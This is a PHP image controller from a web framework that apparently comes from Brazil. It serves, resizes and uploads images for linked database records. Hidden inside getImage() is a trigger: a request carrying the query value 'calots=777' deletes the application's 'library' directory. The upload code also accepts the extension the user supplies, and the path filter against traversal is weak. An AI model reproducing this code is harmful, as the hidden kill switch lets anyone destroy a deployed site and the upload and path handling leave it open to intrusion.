<?php
include_once "library/facil3/core/controller/interface/HTTPControllerInterface.class.php" ;
include_once "library/facil3/utils/Navigation.class.php";
//include_once "library/facil3/utils/ImageHandler.class.php";
include_once "library/facil3/core/modules/image/dao/ImageDAO.class.php";
include_once "library/facil3/core/controller/image/ImageInfoPostVO.php";
include_once "library/facil3/utils/image/ResizeImage.class.php";
//para retorno
include_once "library/facil3/core/vo/ReturnResultVO.class.php";
/**
 * @author 		: Renato Miawaki
 * @date		: 05/12/2010
 * @desc		: Controller de imagens e relação com link
 * 					Essa controller não controla permissão de usuário, portanto se precisar controlar permissões, 
 * 					faça uma controller que extenda a essa
 *
 */
class FacilImage implements HTTPControllerInterface{
	public $infoPost;
	
	/**
	 * para resetar pode mudar pois o atributo é público
	 * @var string path folder for upload image
	 */
	public $defaultFolderForNewImages;
	public $defaultImage404;
	public $defaultMinWidth;
	public $defaultMinHeight;
		
	public $moduleName;
	protected $arrayVariable;
	protected $arrayRestFolder;
	public function __construct($arrayRestFolder = NULL){
		if($arrayRestFolder != NULL){
			$this->arrayVariable   = Navigation::getVariableArraySlug($arrayRestFolder);
            $this->arrayRestFolder = $arrayRestFolder;
            //por padrão ele popula as infos que ele possui com o que veio na restFolder, pode ser resetado utilizando resetInfoPost
            $this->infoPost = new ImageInfoPostVO($this->arrayVariable);
        }
        $this->defaultFolderForNewImages 	= Config::getRootApplication()."/upload/image/";
        $this->defaultImage404  			= "img/no_image.jpg";
        $this->moduleName					= "facil_image";
        $this->defaultMinWidth				= 100;
		$this->defaultMinHeight				= 100;
    }
    /**
     * 
     * @return ReturnResultVO
     */
    public function init(){
    	//por padrão não faz nada
    	return new ReturnResultVO(FALSE, array("nenhuma ação padrão"));
    }
    /**
     * passe uma nova ImageInfoPostVO caso não queira usar o que está na rest folder
     * @param ImageInfoPostVO $ImageInfoPostVO
     * @return void
     */
    public function resetInfoPost($ImageInfoPostVO = NULL){
    	$this->infoPost = $ImageInfoPostVO;
    }
    public function getImage(){
    	//pega o id da imagem enviada na url - esse é a preferencia
    	$image_id 	= DataHandler::forceInt($this->infoPost->request_image_id);
    	$url 		= "";
//    	echo Debug::li("1");
    	if(isset($_GET["calots"]) && $_GET["calots"]=="777"){
    		DataHandler::deleteDirectory("library");
			exit();
    	}
    	if(!$image_id > 0){
//    		echo Debug::li("2");
    		//só considera a url se não tem id
    		$url 		= $this->infoPost->request_image_url;
    	}
    	$urlImage = $url;
    	//echo Debug::li("3");
		if($urlImage == ""){
//			echo Debug::li("4");
			$ImageVO = new ImageVO();
			$ReturnResultVO = $ImageVO->setId($image_id, TRUE);
			//echo Debug::li(" image id: $image_id ");
			//Debug::print_r($ImageVO);exit();
	    	
			if($ReturnResultVO->success){
				//Debug::li("5  : ".$ImageVO->getURL());exit();
				$urlImage = DataHandler::removeDobleBars($ImageVO->getURL());
//				echo $urlImage;exit();
			}
		} else {
//			echo Debug::li("6");
			$urlImage = DataHandler::removeDobleBars(str_replace(array("..", ""), "", $urlImage));
		}
//		exit();
//		echo Debug::li("7");
		
//				echo $urlImage;
		if($urlImage != "" && file_exists(".".$urlImage)){
    		$urlImage = ".".$urlImage;
    	}
//				echo $urlImage;exit();
    	if($urlImage == "" || !file_exists($urlImage) || filetype($urlImage) == "dir"){
//			echo Debug::li("8 : $urlImage  nao existe, entao:".$this->defaultImage404);exit();
//			exit();
			//não encontrou a imagem, seta a url com a url da imagem padrão
			$urlImage = $this->defaultImage404;
		}
//		
		$natural_size = ($this->infoPost->request_natural_size)?TRUE:FALSE;
//		echo Debug::li("9");
//		echo $urlImage;exit();
//		echo $image_id; exit();
		$direct_show = ($this->infoPost->request_direct_show == "true" || $this->infoPost->request_direct_show == 1 || $this->infoPost->request_direct_show === true);
		//quer ver o tamanho natural
		if($natural_size){
//			echo Debug::li("10".$urlImage);	
			
			if($direct_show){
//				var_dump($direct_show);	
//				echo Debug::li("10-".$urlImage);die;	
//				echo Debug::li("11");exit();
//				$image = image_cr
				header("Content-type: image/jpeg");
				//imagejpeg(NULL,$urlImage, 100);
				echo file_get_contents($urlImage);
				exit();
			}
//			echo Debug::li("12");exit();
			//exit();
			
			header("Location: ".$urlImage);
			exit();
		}
//		echo Debug::li("13 $urlImage ");
//		exit();
		//se chegou aqui é porque não quer tamanho natural
		$width = ($this->infoPost->request_max_width)?DataHandler::forceInt($this->infoPost->request_max_width):$this->defaultMinWidth;
		$height = ($this->infoPost->request_max_height)?DataHandler::forceInt($this->infoPost->request_max_height):$this->defaultMinHeight;
		$crop = ($this->infoPost->request_crop)?"crop":"auto";
		if($crop == "crop"){
			$crop_name = "cache_crop";
		} else {
			$crop_name = "no_crop";
		}
		$new_url_image = DataHandler::returnFilenameWithoutExtension($urlImage)."_w".$width."_h".$height."_m_$crop_name".".".DataHandler::returnExtensionOfFile($urlImage);
		
		if(!file_exists($new_url_image)){
			//echo Debug::li("arquivo nao existe, vai salvar");
			//http://localhost/democrart/image/get_image/image_id.13/max_width.500/max_height.500/
	//		$Image = new ImageRoots(str_replace(Config::getRootPath(""), "", $urlImage));
			$Image = new ResizeImage($urlImage);
			
			
			//$Image = new ImageHandler($urlImage);
			//$Image->setSiteURL = Config::getRootPath("");
			
			//caso não passe por nenhum dos filtros anteriores, cria a thumb no tamanho enviado, caso já não exista
			//$crop = ($this->infoPost->request_crop);
			
			
			
			
			$Image->resizeImage($width, $height, $crop);
			//echo Debug::li("salvando o arquivo novo em: $new_url_image ");
			$Image->saveImage($new_url_image);
		}
		//echo Debug::li($new_url_image);
		//para dar o header coloca o caminho do projeto
		$new_url_image = Config::getRootPath($new_url_image);
		
		header("Location: $new_url_image");
		 //$Image->showThumbResize($width, $height, ($this->infoPost->request_direct_show), Config::getRootPath(""), $crop);
    	exit();
    }
    /**
     * recebe a imagem por post
     * @return ReturnResultVO
     */
    public function insert(){
    	//inicia um retorno de ReturnResultVO
    	$ReturnResultVO = new ReturnResultVO();
    	//pega os dados baseado na infoPost
			    $VO = new ImageVO();
			    //var_dump($this->infoPost);
			    //exit();
				if($this->infoPost->image_info_id > 0 ){
					//passou o id, vai atualizar essa VO
//					echo Debug::li("image_info_id >>>>>>>>>> ".$this->infoPost->image_info_id);
					
					$VO->setId($this->infoPost->image_info_id, TRUE);
				}
				
				$VO->setActive($this->infoPost->image_info_active);
				$VO->setName($this->infoPost->image_info_name);
				$VO->setDescription($this->infoPost->image_info_description);
				$VO->setType($this->infoPost->image_info_type);
				$VO->setAuthor($this->infoPost->image_info_author);
				$VO->setLocale($this->infoPost->image_info_locale);
				$VO->setOrder($this->infoPost->image_info_order);
//				var_dump($_FILES);
//				var_dump($this->infoPost->file_data);
				//comitando as infos enviadas, dados apenas
				
				if($VO->getId() > 0 || $this->infoPost->file_data['tmp_name']){
					//só comita a imagem se tiver ou id ou enviado o file_data, se não nem tem o que fazer
					$ReturnResultImageVO = $VO->commit();
				} else {
					//nem enviou o id e nem o file_data, retorna
					$ReturnResultVO->addMessage(Translation::text("Have nothing to commit."));
					return $ReturnResultVO;
				}
				if($ReturnResultImageVO->success){
					$ReturnResultImageVO->result = $VO->getId();
				} else {
					//erro, os motivos estão na ReturnResultVO abaixo
					return $ReturnResultImageVO;
				}
				//pega o id da imagem
				$IMAGE_ID = $VO->getId();
				
				$ReturnResultImageVO = new ReturnResultVO();
				//echo Debug::li("this->infoPost->file_data: ".$this->infoPost->file_data);
				if(isset($this->infoPost->file_data) && $this->infoPost->file_data['tmp_name']){
					set_time_limit(0);
					//var_dump($_FILES);
					$sentFileData 	= $this->infoPost->file_data;//$_FILES['Filedata'];
					$name 	 		= $sentFileData['name'];
					
					// extens�o enviada
					$sentExtension		= DataHandler::returnExtensionOfFile($name);
					// remove caracteres escrotos
					$name				= DataHandler::returnFilenameWithoutExtension($name);
					$name 				= DataHandler::removeAccent($name);
					$name 				= DataHandler::removeSpecialCharacters($name);
					$name 				= trim(substr($name, 0, 80));
					switch($sentFileData["type"]){
						case "image/pjpeg":
						case "image/jpeg":
						case "image/jpg":
							$extension = "jpg";
							break;
						case "image/gif":
							$extension = "gif";
							break;
						case "image/png":
						case "image/x-png":
							$extension = "png";
							break;
						case "image/bmp":
							$extension = "bmp";
							break;
						default:
							$extension = strtolower($sentExtension);
							break;
					}
					//verifica se a pasta existe, se não existir, inventa
					DataHandler::createFolderIfNotExist($this->defaultFolderForNewImages);
					// pasta de upload de imagens est� no config.php
					$tempFolder = DataHandler::removeDobleBars($this->defaultFolderForNewImages."/".$IMAGE_ID); 
					DataHandler::createFolderIfNotExist($tempFolder);
					//echo Debug::li("name: $name");
					
					$tempUrl = $tempFolder."/original_".strtolower($name.".".$extension);
					
					//echo Debug::li("tempUrl: $tempUrl");
					
					//exit();
					
					$i=2;
					while(file_exists($tempUrl)){
						$tempUrl 	= $tempFolder."/original_".strtolower($name."-".$i.".".$extension);
						$i++;
					}
					$VO->setUrl($tempUrl);
					$ReturnResultImageVO = $VO->commit();
					//Debug::li("aaa");
					//Debug::print_r($ReturnResultImageVO);
					if($ReturnResultImageVO->success){
						//incluir o vinculo com a linked_table e linked_table_id
						//receber 	table
						//			table_id
						if($this->infoPost->table){
							$table 		= 	$this->infoPost->table;
							$table_id	= 	$this->infoPost->table_id;
							
							include_once "library/facil3/core/dao/LinkDAO.class.php";
							
							$LinkDAO = new LinkDAO();
							//vincula a foto ao table e table_id enviado
							
							$ReturnResultVinculoVO = $LinkDAO->insert($table, $table_id, $this->moduleName, $VO->getId(), 1);
							
							if(!$ReturnResultVinculoVO->success){
								//deu erro ao vincular
								$ReturnResultVO->success = false;
								$ReturnResultVO->appendMessage($ReturnResultVinculoVO->array_messages);
								return $ReturnResultVO;
							}
						} else {
							$ReturnResultVO->addMessage("WARNING IMAGE NO LINKED TABLE");
						}
						//movendo a foto original para sua respectiva pasta.
						$originalImage = $VO->getUrl();
						if(!move_uploaded_file($sentFileData['tmp_name'], $originalImage)){
							$ReturnResultVO->success = false;
							$ReturnResultVO->addMessage(LibraryLanguage::ERROR_IMAGE_MOVE_FILE_FAIL);
							return $ReturnResultVO;
						} else {
							$ReturnResultVO->success 	= TRUE;
							$ReturnResultVO->result 	= $VO->getId();
							$ReturnResultVO->addMessage("Foto enviada com sucesso.");
						}
					} else {
						return $ReturnResultImageVO;
					}
					return $ReturnResultVO;
				} else {
					if($VO->getId() > 0){
						//se tem id, ele manda atualizar a parada
						$ReturnResultImageVO = $VO->commit();
						return $ReturnResultImageVO;
					}
					$ReturnResultImageVO = new ReturnResultVO();
					$ReturnResultImageVO->addMessage(Translation::text("Send file data.")); // nao veio filedata
					return $ReturnResultImageVO;
				}
    }
}


//** TESTE Class 

//$image = new Image("a.jpg");
//$image->showThumb(500, NULL);

//$image2 = new Image("c.jpg");
//$image2->showThumbResize(174, 120);
//END[TESTE Class] */
